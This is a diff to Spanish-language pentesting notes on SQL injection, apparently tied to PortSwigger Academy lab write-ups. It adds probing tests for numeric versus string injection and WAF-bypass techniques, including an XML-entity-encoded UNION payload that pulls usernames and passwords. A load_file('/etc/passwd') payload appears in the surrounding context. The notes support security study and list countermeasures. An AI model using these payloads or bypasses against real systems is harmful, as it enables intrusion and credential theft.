@@ -17,6 +17,22 @@ La inyección SQL (SQLi) ocurre cuando una aplicación web inserta datos de entr
 
 ## Comandos / Ejemplos
 
+### Sondeo previo — numeric vs string SQLi
+
+Antes de tirar payloads con keywords (`UNION`, `'`, `OR 1=1`), conviene saber **cómo se inserta el campo en la query**:
+
+- **Numeric SQLi**: el campo se concatena sin comillas. `WHERE id=<VALOR>`. El valor se interpreta como expresión.
+- **String SQLi**: el campo va entre comillas. `WHERE id='<VALOR>'`. Hay que cerrar la comilla antes de inyectar.
+
+**Test aritmético** (sondeo más limpio para numeric, pasa por debajo de cualquier WAF basado en patrones):
+- Si el valor original es `2`, mandar `3-1`. Si la respuesta es la misma → numeric SQLi confirmada (la DB evaluó la resta).
+- Si la respuesta cambia o falla → o el campo está parametrizado, o es string SQLi. Pasar al test con `'`.
+
+**Test de comilla** (clásico para detectar string):
+- Mandar `xyz'`. Si rompe la sintaxis (error 500, mensaje raro, comportamiento distinto) → SQLi presente.
+
+Con esa info ya sabes si necesitas `'` para cerrar el string o puedes inyectar directo después del número.
+
 ### 1. Inyección Basada en Error (Error-based)
 Útil cuando el servidor devuelve mensajes de error detallados de la DB. La idea: forzar a la DB a evaluar una subquery cuyo resultado quede embebido en el mensaje de error como canal de exfiltración.
 
@@ -125,6 +141,42 @@ La entidad `%remote` se resuelve durante el `xmltype()` — antes incluso de lle
 Si el usuario de la DB tiene permisos de lectura y la variable `secure_file_priv` es nula:
 - **MySQL**: `' UNION SELECT 1, load_file('/etc/passwd'), 3, 4--`
 
+### 6. WAF Bypass — Encoding asimétrico
+
+Un patrón recurrente: el **WAF inspecciona el body en wire format** (XML/JSON/multipart raw como string) buscando substrings tipo `UNION`, `SELECT`, `'`. Pero el **backend procesa el body parseado**, después de que el parser correspondiente decodee escapes y entidades. Esa asimetría es el bug: si codificamos las keywords en algún esquema que el WAF no aplica pero el parser sí, el payload pasa.
+
+**Bypass por formato del body**:
+
+| Formato | Esquema de encoding | Ejemplo (`UNION`) |
+|---|---|---|
+| **XML** | Hex/decimal entities `&#xHH;` / `&#NNN;` | `&#x55;NION` (sólo la `U`) o `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` (todo) |
+| **JSON** | Unicode escapes `\uHHHH` | `"UNION SELECT"` |
+| **HTML form** | URL-encoding `%HH` | `%55NION%20SELECT` (poco efectivo, los WAFs suelen URL-decodear antes) |
+| **Multipart** | Encabezados `Content-Transfer-Encoding: base64`/`quoted-printable` | Body codificado, WAF que no decodea no ve el patrón |
+| **gzip/deflate** | Compresión del body con `Content-Encoding: gzip` | Algunos WAFs no descomprimen antes de inspeccionar |
+
+**Ejemplo XML — el más limpio en la práctica**:
+
+```xml
+<!-- WAF ve esto (sin coincidir con 'UNION SELECT'): -->
+<storeId>1 &#x55;NION &#x53;ELECT username||&#x27;~&#x27;||password FROM users</storeId>
+
+<!-- Backend recibe esto despues de parsear: -->
+<!-- 1 UNION SELECT username||'~'||password FROM users -->
+```
+
+Sólo encodear **la primera letra** de cada keyword bloqueada es suficiente para romper el match exacto y mantiene el payload legible. Encodear la palabra entera funciona igual pero es más ruidoso.
+
+**Otros bypasses comunes a nivel SQL** (no por encoding, sino por equivalencias semánticas):
+
+- **Comentarios inline para romper el match**: `UN/**/ION SE/**/LECT` (MySQL, MariaDB).
+- **Case alternation**: `UnIoN SeLeCt` cuando el WAF hace match case-sensitive (raro pero existe).
+- **Whitespace alternativo**: `UNION%09SELECT` (tab), `UNION/**/SELECT` (comentario), `UNION%0aSELECT` (newline).
+- **Equivalencias semánticas**: `||` en lugar de `OR` (PostgreSQL/Oracle/SQLite — concat, pero también permite `OR` en algunos contextos), `&&` en lugar de `AND` (MySQL).
+- **Funciones equivalentes**: `MID()` en lugar de `SUBSTRING()`, `IIF()` en lugar de `CASE WHEN`.
+
+> **Heurística**: si el WAF bloquea una keyword, lo primero que hay que probar es **encoding por formato del body** (XML/JSON entities). Si el body no permite encoding (texto plano, URL params), pasar a **comentarios inline** y **whitespace alternativo**. Si nada de eso pasa, probar **equivalencias semánticas**. Combinar varias técnicas a la vez suele bypassear hasta WAFs decentes.
+
 ## Contramedidas
 - **Consultas Preparadas (Sentencias Parametrizadas)**: Única defensa 100% efectiva (ej. `PDO` en PHP, `PreparedStatement` en Java).
 - **Principio de Mínimo Privilegio**: La cuenta de la DB de la web no debe ser `root` ni `sa`.
@@ -138,3 +190,4 @@ Si el usuario de la DB tiene permisos de lectura y la variable `secure_file_priv
 - Writeup propio: [`learning/portswigger/visible-error-based-sql-injection/writeup.md`](../../../learning/portswigger/visible-error-based-sql-injection/writeup.md) — ejemplo end-to-end del primitivo `CAST` en PostgreSQL leyendo `users.password` desde una cookie de tracking, incluyendo workaround con `||` ante límite de longitud.
 - Writeup propio: [`learning/portswigger/blind-sqli-time-delays/writeup.md`](../../../learning/portswigger/blind-sqli-time-delays/writeup.md) — ejemplo end-to-end de time-based con `pg_sleep` vía stacked queries en cookie, incluyendo el detalle de URL-encodear el `;` como `%3B`.
 - Writeup propio: [`learning/portswigger/blind-sqli-out-of-band/writeup.md`](../../../learning/portswigger/blind-sqli-out-of-band/writeup.md) — ejemplo de OOB en Oracle vía XXE en `xmltype()` + diagnóstico del bloqueo por allowlist de OAST en PortSwigger Academy (sólo `*.oastify.com`).
+- Writeup propio: [`learning/portswigger/sqli-filter-bypass-xml-encoding/writeup.md`](../../../learning/portswigger/sqli-filter-bypass-xml-encoding/writeup.md) — ejemplo end-to-end de WAF bypass vía XML hex entities (`&#x55;NION`) sobre endpoint que recibe XML, incluyendo el sondeo aritmético `3-1` para confirmar numeric SQLi sin tocar keywords.
